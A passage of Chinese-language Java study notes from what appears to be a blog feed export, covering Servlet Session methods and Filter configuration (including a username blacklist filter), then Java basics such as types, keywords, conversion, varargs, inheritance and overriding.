<td>返回在无任何操作的情况下，Session 失效的时间，以秒为单位。</td>
</tr>
<tr>
<td>ServletContext</td>
<td>getServletContext()</td>
<td>返回 Session 所属的 ServletContext 对象。</td>
</tr>
<tr>
<td>void</td>
<td>invalidate()</td>
<td>使 Session 失效。</td>
</tr>
<tr>
<td>void</td>
<td>setMaxInactiveInterval(int interval)</td>
<td>指定在无任何操作的情况下，Session 失效的时间，以秒为单位。负数表示 Session 永远不会失效。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>void</td>
<td>setAttribute(String name, Object o)</td>
<td>把一个 Java 对象与一个属性名绑定，并将它作为一个属性存放到 Session 对象中。 参数 name 为属性名，参数 object 为属性值。</td>
</tr>
<tr>
<td>Object</td>
<td>getAttribute(String name)</td>
<td>根据指定的属性名 name，返回 Session 对象中对应的属性值。</td>
</tr>
<tr>
<td>void</td>
<td>removeAttribute(String name)</td>
<td>从 Session 对象中移除属性名为 name 的属性。</td>
</tr>
<tr>
<td>Enumeration</td>
<td>getAttributeNames()</td>
<td>用于返回 Session 对象中的所有属性名的枚举集合。</td>
</tr>
</tbody>
</table>
<h2 id="Filter">Filter</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>FORWARD<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter(</span></span><br><span class="line"><span class="meta">        dispatcherTypes = &#123;</span></span><br><span class="line"><span class="meta">                DispatcherType.REQUEST,</span></span><br><span class="line"><span class="meta">                DispatcherType.FORWARD,</span></span><br><span class="line"><span class="meta">        &#125;,</span></span><br><span class="line"><span class="meta">        urlPatterns = &#123;&quot;/login&quot;&#125;,</span></span><br><span class="line"><span class="meta">        servletNames = &#123;&quot;ServletDemo&quot;&#125;)</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>属性名</th>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>filterName</td>
<td>String</td>
<td>指定过滤器的 name 属性，等价于 <code>&lt;filter-name&gt;</code>。</td>
</tr>
<tr>
<td>urlPatterns</td>
<td>String[]</td>
<td>指定过滤器的 URL 匹配模式。等价于 <code>&lt;url-pattern&gt;</code> 标签。</td>
</tr>
<tr>
<td>value</td>
<td>String[]</td>
<td>该属性等价于 urlPatterns 属性，但是两者不能同时使用。</td>
</tr>
<tr>
<td>servletNames</td>
<td>String[]</td>
<td>指定过滤器将应用于哪些 Servlet。取值是 @WebServlet 中 filterName 属性的取值，或者 web.xml 中 <code>&lt;servlet-name&gt;</code> 的取值。</td>
</tr>
<tr>
<td>dispatcherTypes</td>
<td>DispatcherType</td>
<td>指定过滤器拦截的资源被 Servlet 容器调用的方式。具体取值包括： ASYNC、ERROR、FORWARD、INCLUDE、REQUEST。</td>
</tr>
<tr>
<td>initParams</td>
<td>WebInitParam[]</td>
<td>指定一组过滤器初始化参数，等价于<code> &lt;init-param&gt;</code> 标签。</td>
</tr>
<tr>
<td>asyncSupported</td>
<td>boolean</td>
<td>声明过滤器是否支持异步操作模式，等价于 <code>&lt;async-supported&gt; </code>标签。</td>
</tr>
<tr>
<td>description</td>
<td>String</td>
<td>指定过滤器的描述信息，等价于 <code>&lt;description&gt;</code> 标签。</td>
</tr>
<tr>
<td>displayName</td>
<td>String</td>
<td>指定过滤器的显示名，等价于 <code>&lt;display-name&gt;</code> 标签。</td>
</tr>
</tbody>
</table>
<h3 id="Filter-链中-Filter-的执行顺序">Filter 链中 Filter 的执行顺序</h3>
<p>通过 web.xml 配置的 Filter 过滤器，执行顺序由 <code>&lt;filter-mapping&gt;</code> 标签的配置顺序决定。<code>&lt;filter-mapping&gt;</code> 靠前，则 Filter 先执行，靠后则后执行。通过修改<code> &lt;filter-mapping&gt;</code> 的顺序便可以修改 Filter 的执行顺序。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--过滤器链中FirstChainFilter配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FirstChainFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>FirstChainFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FirstChainFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--过滤器链中SecondChainFilter配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SecondChainFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>SecondChainFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SecondChainFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="黑名单">黑名单</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackListFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> FilterConfig fConfig;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">successde</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//获取前台登录的账号信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="comment">//获取过滤器中的初始化参数</span></span><br><span class="line">        Enumeration&lt;String&gt; blackListNames = fConfig.getInitParameterNames();</span><br><span class="line">        <span class="comment">//判断前台登录账号是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(name)) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;用户名不能为空&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//登录账号不为空，循环遍历黑名单</span></span><br><span class="line">            <span class="keyword">while</span> (blackListNames.hasMoreElements()) &#123;</span><br><span class="line">                <span class="comment">//若登录账号是黑名单账号则不允许登录</span></span><br><span class="line">                <span class="keyword">if</span> (fConfig.getInitParameter(blackListNames.nextElement()).equals(name)) &#123;</span><br><span class="line">                    successde = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (successde) &#123;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.getWriter().write(<span class="string">&quot;sucess&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig fConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">this</span>.fConfig = fConfig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BlackListFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>BlackListFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>blackList<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>user<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BlackListFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java基础</title>
    <url>/2023/08/16/17-48-33/</url>
    <content><![CDATA[<h1>java 基础</h1>
<span id="more"></span>
<h2 id="java特性">java特性</h2>
<ol>
<li>java具有跨平台性</li>
<li>java语言面向对象</li>
<li>java语言是健壮的，强类型机制，异常处理，垃圾的自动收集等是java健壮性的重要保证</li>
<li>java是解释型的（由于java在JVM上解释运行）</li>
</ol>
<h2 id="java编译与流程">java编译与流程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac test.java</span><br><span class="line">java test //运行的是test的类，而不是test.class的类</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.java文件 -&gt; javac编译 -&gt; .class文件 -&gt; java运行</span><br></pre></td></tr></table></figure>
<h2 id="java开发细节">java开发细节</h2>
<ol>
<li>java程序的入口是main()方法，具有固定的书写格式</li>
<li>一个java文件中只能存在一个public类，但是类可以多个</li>
<li>编译之后，每一个类都对应一个.class文件</li>
<li>文件名和public类名相同</li>
<li>main入口不一定在public类中</li>
</ol>
<h2 id="文档注释">文档注释</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javadoc -d 文件名 标签 test.java</span><br></pre></td></tr></table></figure>
<h2 id="javadoc-标签">javadoc 标签</h2>
<p>javadoc 工具软件识别以下标签：</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>标签</strong></th>
<th style="text-align:center"><strong>描述</strong></th>
<th style="text-align:left"><strong>示例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">@author</td>
<td style="text-align:center">标识一个类的作者</td>
<td style="text-align:left">@author description</td>
</tr>
<tr>
<td style="text-align:left">@deprecated</td>
<td style="text-align:center">指名一个过期的类或成员</td>
<td style="text-align:left">@deprecated description</td>
</tr>
<tr>
<td style="text-align:left">{@docRoot}</td>
<td style="text-align:center">指明当前文档根目录的路径</td>
<td style="text-align:left">Directory Path</td>
</tr>
<tr>
<td style="text-align:left">@exception</td>
<td style="text-align:center">标志一个类抛出的异常</td>
<td style="text-align:left">@exception exception-name explanation</td>
</tr>
<tr>
<td style="text-align:left">{@inheritDoc}</td>
<td style="text-align:center">从直接父类继承的注释</td>
<td style="text-align:left">Inherits a comment from the immediate surperclass.</td>
</tr>
<tr>
<td style="text-align:left">{@link}</td>
<td style="text-align:center">插入一个到另一个主题的链接</td>
<td style="text-align:left">{@link name text}</td>
</tr>
<tr>
<td style="text-align:left">{@linkplain}</td>
<td style="text-align:center">插入一个到另一个主题的链接，但是该链接显示纯文本字体</td>
<td style="text-align:left">Inserts an in-line link to another topic.</td>
</tr>
<tr>
<td style="text-align:left">@param</td>
<td style="text-align:center">说明一个方法的参数</td>
<td style="text-align:left">@param parameter-name explanation</td>
</tr>
<tr>
<td style="text-align:left">@return</td>
<td style="text-align:center">说明返回值类型</td>
<td style="text-align:left">@return explanation</td>
</tr>
<tr>
<td style="text-align:left">@see</td>
<td style="text-align:center">指定一个到另一个主题的链接</td>
<td style="text-align:left">@see anchor</td>
</tr>
<tr>
<td style="text-align:left">@serial</td>
<td style="text-align:center">说明一个序列化属性</td>
<td style="text-align:left">@serial description</td>
</tr>
<tr>
<td style="text-align:left">@serialData</td>
<td style="text-align:center">说明通过writeObject( ) 和 writeExternal( )方法写的数据</td>
<td style="text-align:left">@serialData description</td>
</tr>
<tr>
<td style="text-align:left">@serialField</td>
<td style="text-align:center">说明一个ObjectStreamField组件</td>
<td style="text-align:left">@serialField name type description</td>
</tr>
<tr>
<td style="text-align:left">@since</td>
<td style="text-align:center">标记当引入一个特定的变化时</td>
<td style="text-align:left">@since release</td>
</tr>
<tr>
<td style="text-align:left">@throws</td>
<td style="text-align:center">和 @exception标签一样.</td>
<td style="text-align:left">The @throws tag has the same meaning as the @exception tag.</td>
</tr>
<tr>
<td style="text-align:left">{@value}</td>
<td style="text-align:center">显示常量的值，该常量必须是static属性。</td>
<td style="text-align:left">Displays the value of a constant, which must be a static field.</td>
</tr>
<tr>
<td style="text-align:left">@version</td>
<td style="text-align:center">指定类的版本</td>
<td style="text-align:left">@version info</td>
</tr>
</tbody>
</table>
<h2 id="Java-关键字">Java 关键字</h2>
<p>下面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">关键字</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">private</td>
<td style="text-align:left">私有的</td>
</tr>
<tr>
<td style="text-align:left">protected</td>
<td style="text-align:left">受保护的</td>
</tr>
<tr>
<td style="text-align:left">public</td>
<td style="text-align:left">公共的</td>
</tr>
<tr>
<td style="text-align:left">default</td>
<td style="text-align:left">默认</td>
</tr>
<tr>
<td style="text-align:left">abstract</td>
<td style="text-align:left">声明抽象</td>
</tr>
<tr>
<td style="text-align:left">class</td>
<td style="text-align:left">类</td>
</tr>
<tr>
<td style="text-align:left">extends</td>
<td style="text-align:left">扩充、继承</td>
</tr>
<tr>
<td style="text-align:left">final</td>
<td style="text-align:left">最终值、不可改变的</td>
</tr>
<tr>
<td style="text-align:left">implements</td>
<td style="text-align:left">实现（接口）</td>
</tr>
<tr>
<td style="text-align:left">interface</td>
<td style="text-align:left">接口</td>
</tr>
<tr>
<td style="text-align:left">native</td>
<td style="text-align:left">本地、原生方法（非 Java 实现）</td>
</tr>
<tr>
<td style="text-align:left">new</td>
<td style="text-align:left">创建</td>
</tr>
<tr>
<td style="text-align:left">static</td>
<td style="text-align:left">静态</td>
</tr>
<tr>
<td style="text-align:left">strictfp</td>
<td style="text-align:left">严格浮点、精准浮点</td>
</tr>
<tr>
<td style="text-align:left">synchronized</td>
<td style="text-align:left">线程、同步</td>
</tr>
<tr>
<td style="text-align:left">transient</td>
<td style="text-align:left">短暂</td>
</tr>
<tr>
<td style="text-align:left">volatile</td>
<td style="text-align:left">易失</td>
</tr>
<tr>
<td style="text-align:left">break</td>
<td style="text-align:left">跳出循环</td>
</tr>
<tr>
<td style="text-align:left">case</td>
<td style="text-align:left">定义一个值以供 switch 选择</td>
</tr>
<tr>
<td style="text-align:left">continue</td>
<td style="text-align:left">继续</td>
</tr>
<tr>
<td style="text-align:left">do</td>
<td style="text-align:left">运行</td>
</tr>
<tr>
<td style="text-align:left">else</td>
<td style="text-align:left">否则</td>
</tr>
<tr>
<td style="text-align:left">for</td>
<td style="text-align:left">循环</td>
</tr>
<tr>
<td style="text-align:left">if</td>
<td style="text-align:left">如果</td>
</tr>
<tr>
<td style="text-align:left">instanceof</td>
<td style="text-align:left">实例</td>
</tr>
<tr>
<td style="text-align:left">return</td>
<td style="text-align:left">返回</td>
</tr>
<tr>
<td style="text-align:left">switch</td>
<td style="text-align:left">根据值选择执行</td>
</tr>
<tr>
<td style="text-align:left">while</td>
<td style="text-align:left">循环</td>
</tr>
<tr>
<td style="text-align:left">assert</td>
<td style="text-align:left">断言表达式是否为真</td>
</tr>
<tr>
<td style="text-align:left">catch</td>
<td style="text-align:left">捕捉异常</td>
</tr>
<tr>
<td style="text-align:left">finally</td>
<td style="text-align:left">有没有异常都执行</td>
</tr>
<tr>
<td style="text-align:left">throw</td>
<td style="text-align:left">抛出一个异常对象</td>
</tr>
<tr>
<td style="text-align:left">throws</td>
<td style="text-align:left">声明一个异常可能被抛出</td>
</tr>
<tr>
<td style="text-align:left">try</td>
<td style="text-align:left">捕获异常</td>
</tr>
<tr>
<td style="text-align:left">import</td>
<td style="text-align:left">引入</td>
</tr>
<tr>
<td style="text-align:left">package</td>
<td style="text-align:left">包</td>
</tr>
<tr>
<td style="text-align:left">boolean</td>
<td style="text-align:left">布尔型</td>
</tr>
<tr>
<td style="text-align:left">byte</td>
<td style="text-align:left">字节型</td>
</tr>
<tr>
<td style="text-align:left">char</td>
<td style="text-align:left">字符型</td>
</tr>
<tr>
<td style="text-align:left">double</td>
<td style="text-align:left">双精度浮点</td>
</tr>
<tr>
<td style="text-align:left">float</td>
<td style="text-align:left">单精度浮点</td>
</tr>
<tr>
<td style="text-align:left">int</td>
<td style="text-align:left">整型</td>
</tr>
<tr>
<td style="text-align:left">long</td>
<td style="text-align:left">长整型</td>
</tr>
<tr>
<td style="text-align:left">short</td>
<td style="text-align:left">短整型</td>
</tr>
<tr>
<td style="text-align:left">super</td>
<td style="text-align:left">父类、超类</td>
</tr>
<tr>
<td style="text-align:left">this</td>
<td style="text-align:left">本类</td>
</tr>
<tr>
<td style="text-align:left">void</td>
<td style="text-align:left">无返回值</td>
</tr>
<tr>
<td style="text-align:left">goto</td>
<td style="text-align:left">是关键字，但不能使用</td>
</tr>
<tr>
<td style="text-align:left">const</td>
<td style="text-align:left">是关键字，但不能使用</td>
</tr>
</tbody>
</table>
<p>**注意：**Java 的 null 不是关键字，类似于 true 和 false，它是一个字面常量，不允许作为标识符使用。</p>
<h2 id="变量类型">变量类型</h2>
<h3 id="整型">整型</h3>
<p>byte	1字节</p>
<p>short	2字节</p>
<p>int 		4字节</p>
<p>long		8字节</p>
<h3 id="浮点型">浮点型</h3>
<p>float	4字节</p>
<p>double 8字节</p>
<p>//float 常量定义需要在数的尾部加上F/f</p>
<p>注意：浮点型比较的时候需要使用API接口进行比较，精度上无法准确判断两者是否相等</p>
<h2 id="API接口构成以及数据转化类型">API接口构成以及数据转化类型</h2>
<p><img src="/img/image-20230717210557554.png" alt="image-20230717210557554" /></p>
<p><img src="/img/image-20230717210738882.png" alt="image-20230717210738882" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//细节 1： 有多种类型的数据混合运算时，</span><br><span class="line">//系统首先自动将所有数据转换成容量最大的那种数据类型，然后再进行计算</span><br><span class="line">//细节 2: 当我们把精度(容量)大 的数据类型赋值给精度(容量)小 的数据类型时，</span><br><span class="line">//就会报错，反之就会进行自动类型转换</span><br><span class="line">//细节 3: (byte, short) 和 char 之间不会相互自动转换</span><br><span class="line">//当把具体数赋给 byte 时，(1)先判断该数是否在 byte 范围内</span><br><span class="line">//细节 4: byte，short，char 他们三者可以计算，在计算时首先转换为 int 类型</span><br><span class="line">//自动提升原则： 表达式结果的类型自动提升为 操作数中最大的</span><br></pre></td></tr></table></figure>
<h3 id="强制转化">强制转化</h3>
<p>自动类型转换的逆过程，将容量大的数据类型转换为容量小的数据类型。使用时要加上强制转换符 ( )，但可能造成 精度降低或溢出,格外要注意</p>
<h3 id="String转化">String转化</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int n1 = 100;</span><br><span class="line">float f1 = 1.1F;</span><br><span class="line">double d1 = 4.5;</span><br><span class="line">boolean b1 = true;</span><br><span class="line">String s1 = n1 + &quot;&quot;;</span><br><span class="line">String s2 = f1 + &quot;&quot;;</span><br><span class="line">String s3 = d1 + &quot;&quot;;</span><br><span class="line">String s4 = b1 + &quot;&quot;;</span><br><span class="line">System.out.println(s1 + &quot; &quot; + s2 + &quot; &quot; + s3 + &quot; &quot; + s4);</span><br></pre></td></tr></table></figure>
<p>通过将其他数据+&quot;&quot;转化成String</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String s = &quot;123&quot;;</span><br><span class="line">int a = Integer.parseInt(s);</span><br><span class="line">//在将 String 类型转成基本数据类型时， ，比如 我们可以把 &quot;123&quot; , 转成一个整数，但是不能把 &quot;hello&quot; 转成一个整数</span><br><span class="line"></span><br><span class="line">//怎么把字符串转成字符 char -&gt; 含义是指 把字符串的第一个字符得到</span><br><span class="line">//解读 s5.charAt(0) 得到 s5 字符串的第一个字符 &#x27;1&#x27; </span><br><span class="line">System.out.println(s5.charAt(0)</span><br></pre></td></tr></table></figure>
<h2 id="逻辑运算">逻辑运算</h2>
<p>常规的不看</p>
<p>特殊的如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;短路与：如果第一个条件为 false，则第二个条件不会判断，最终结果为 false，效率高</span><br><span class="line">&amp; 逻辑与：不管第一个条件是否为 false，第二个条件都要判断，效率低</span><br><span class="line">||短路或：如果第一个条件为 true，则第二个条件不会判断，最终结果为 true，效率高</span><br><span class="line">|逻辑或：不管第一个条件是否为 true，第二个条件都要判断，效率低</span><br></pre></td></tr></table></figure>
<h2 id="命名规则">命名规则</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 包名：多单词组成时所有字母都小写：aaa.bbb.ccc //比如 com.hsp.crm</span><br><span class="line">2) 类名、接口名：多单词组成时，所有单词的首字母大写：XxxYyyZzz [大驼峰]</span><br><span class="line">比如： TankShotGame</span><br><span class="line">3) 变量名、方法名：多单词组成时，第一个单词首字母小写，第二个单词开始每个单词首字母大写：xxxYyyZzz [小</span><br><span class="line">驼峰， 简称 驼峰法]</span><br><span class="line">比如： tankShotGame</span><br><span class="line">4) 常量名：所有字母都大写。多单词时每个单词用下划线连接：XXX_YYY_ZZZ</span><br><span class="line">比如 ：定义一个所得税率 TAX_RATE</span><br></pre></td></tr></table></figure>
<h2 id="用户输入">用户输入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Scanner myScanner = new Scanner(System.in); //新建Scanner对象进行用户输入</span><br><span class="line">char score = myScanner.next().charAt(1);  //接收第二个字符</span><br><span class="line">System.out.println(score);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Scanner中存在next()和nextLine()方法接收输入字符串</span><br><span class="line">has* //合法判断输入</span><br><span class="line">next* //接收合法输入</span><br></pre></td></tr></table></figure>
<h2 id="switch">switch</h2>
<p>只会接受符合 byte、 short 、int、 char, enum[枚举], String 这 6 种类型的变量，多个符合条件的使用穿透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(month) &#123;</span><br><span class="line">case 3:</span><br><span class="line">case 4:</span><br><span class="line">case 5:</span><br><span class="line">System.out.println(&quot;这是春季&quot;);</span><br><span class="line">break;</span><br></pre></td></tr></table></figure>
<h2 id="类与对象">类与对象</h2>
<h3 id="内存">内存</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java 内存的结构分析</span><br><span class="line">1) 栈： 一般存放基本数据类型(局部变量)</span><br><span class="line">2) 堆： 存放对象(Cat cat , 数组等)</span><br><span class="line">3) 方法区：常量池(常量，比如字符串)， 类加载信</span><br></pre></td></tr></table></figure>
<h3 id="递归（跳过）">递归（跳过）</h3>
<p>经典汉诺塔，迷宫等（找时间复习）</p>
<h3 id="重载">重载</h3>
<p>老样子</p>
<h3 id="可变参数">可变参数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java 允许将同一个类中多个同名同功能但参数个数不同的方法，封装成一个方法。</span><br><span class="line">就可以通过可变参数实现</span><br></pre></td></tr></table></figure>
<p>用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*(数据类型... 形参)</span><br><span class="line">public int sum(int... n)&#123;</span><br><span class="line"></span><br><span class="line">&#125;*/</span><br><span class="line">调用传入数组或者(传统)多个参数</span><br><span class="line">public class main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        T t = new T();</span><br><span class="line">        int a[] = &#123;1,2,3&#125;;</span><br><span class="line">        t.f1(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T &#123;</span><br><span class="line">    public void f1(int... nums) &#123;</span><br><span class="line">        System.out.println(&quot;长度=&quot; + nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    //细节: 可变参数可以和普通类型的参数一起放在形参列表，但必须保证可变参数在最后</span><br><span class="line">    public void f2(String str, double... nums) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">//细节: 一个形参列表中只能出现一个可变参数</span><br><span class="line">//下面的写法是错的. // public void f3(int... nums1, double... nums2) &#123;</span><br><span class="line">// &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="继承">继承</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访问，要通过父类提供公共的方法去访问</span><br><span class="line">2) 子类必须调用父类的构造器， 完成父类的初始化 //会先初始化父类再初始化子类</span><br><span class="line">3) 当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过</span><br><span class="line">4) 如果希望指定去调用父类的某个构造器，则显式的调用一下 : super(参数列表)</span><br><span class="line">5) super 在使用时，必须放在构造器第一行(super 只能在构造器中使用)</span><br><span class="line">6) super() 和 this() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器</span><br><span class="line">7) java 所有类都是 Object 类的子类, Object 是所有类的基类. </span><br><span class="line">8) 父类构造器的调用不限于直接父类！将一直往上追溯直到 Object 类(顶级父类)</span><br><span class="line">9) 子类最多只能继承一个父类(指直接继承)，即 java 中是单继承机制。</span><br><span class="line">思考：如何让 A 类继承 B 类和 C 类？ 【A 继承 B， B 继承 C】</span><br><span class="line">10) 不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系</span><br></pre></td></tr></table></figure>
<h3 id="重写">重写</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//细节: 子类方法不能缩小父类方法的访问权限</span><br><span class="line">//public &gt; protected &gt; 默认&gt;private</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="方法的重写规则">方法的重写规则</h3>
<ul>
<li>参数列表与被重写方法的参数列表必须完全相同。</li>
<li>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的<strong>派生类</strong>（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</li>
<li>访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。</li>
<li>父类的成员方法只能被它的子类重写。</li>
<li>声明为 final 的方法不能被重写。</li>
<li>声明为 static 的方法不能被重写，但是能够被再次声明。</li>
